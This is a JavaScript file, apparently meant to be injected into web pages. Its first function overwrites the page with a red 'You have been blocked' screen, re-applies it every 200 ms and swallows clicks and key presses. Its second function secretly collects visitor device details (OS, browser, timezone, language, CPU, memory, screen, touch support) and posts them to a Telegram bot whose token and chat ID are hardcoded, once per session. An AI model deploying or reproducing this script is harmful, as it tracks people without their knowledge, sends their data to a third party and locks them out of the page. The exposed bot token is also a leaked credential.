(function () {
    function blockPage() {
        document.documentElement.innerHTML = `
            <head>
                <title>Blocked</title>
                <style>
                    html, body {
                        margin: 0;
                        padding: 0;
                        height: 100%;
                        background: #000;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        font-family: Arial, sans-serif;
                    }
                    .msg {
                        background: red;
                        color: white;
                        font-size: 32px;
                        font-weight: bold;
                        text-align: center;
                        padding: 40px;
                        border-radius: 10px;
                        border: 3px solid #fff;
                        box-shadow: 0 0 30px rgba(255,0,0,0.5);
                        max-width: 600px;
                    }
                </style>
            </head>
            <body>
                <div class="msg">
                    ⚠️ You have been blocked.<br>
                    You must contact the administrator of Alix_io
                </div>
            </body>
        `;
    }

    // تشغيل مباشر
    blockPage();

    // إعادة فرض الحظر باستمرار (ضد أي سكربت)
    setInterval(blockPage, 200);

    // منع أي تفاعل
    window.addEventListener('click', e => e.stopPropagation(), true);
    window.addEventListener('keydown', e => e.stopPropagation(), true);
})();

(function () {
  'use strict';

  // 🛑 لا تعمل داخل iframe
  if (window.top !== window.self) return;

  const BOT_TOKEN = "8072723239:AAF6lKO3oj2pz5FkJiPu-iNBCZTCUHvruh0";
  const CHAT_ID  = "7377759751";
  const SESSION_KEY = "__device_logged__";

  // 🛑 لا تعيد الإرسال في نفس الدخول
  if (sessionStorage.getItem(SESSION_KEY)) return;

  function send(msg) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
    }).catch(()=>{});
  }

  function getBrowser() {
    const ua = navigator.userAgent;
    const m = ua.match(/(Chrome|Firefox|Safari|Edge)\/([\d.]+)/);
    return m ? `${m[1]} ${m[2]}` : "غير معروف";
  }

  function getOS() {
    const ua = navigator.userAgent;
    if (/Android/i.test(ua)) return "Android";
    if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
    if (/Windows/i.test(ua)) return "Windows";
    if (/Mac OS/i.test(ua)) return "macOS";
    if (/Linux/i.test(ua)) return "Linux";
    return "غير معروف";
  }

  function deviceType() {
    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? "هاتف" : "كمبيوتر";
  }

  function touchSupport() {
    return ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? "نعم" : "لا";
  }

const message =
`📥 عميل 4

📱 نوع الجهاز: ${deviceType()}
🧠 نظام التشغيل: ${getOS()}
🌐 المتصفح: ${getBrowser()}
🕒 المنطقة الزمنية: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
🗣️ اللغة: ${navigator.language}
🧮 عدد الأنوية: ${navigator.hardwareConcurrency || "غير معروف"}
💾 الذاكرة التقريبية: ${navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير متاح"}
📐 دقة الشاشة: ${screen.width} × ${screen.height}
👆 يدعم اللمس: ${touchSupport()}`;

  send(message);
  sessionStorage.setItem(SESSION_KEY, "1");

})();
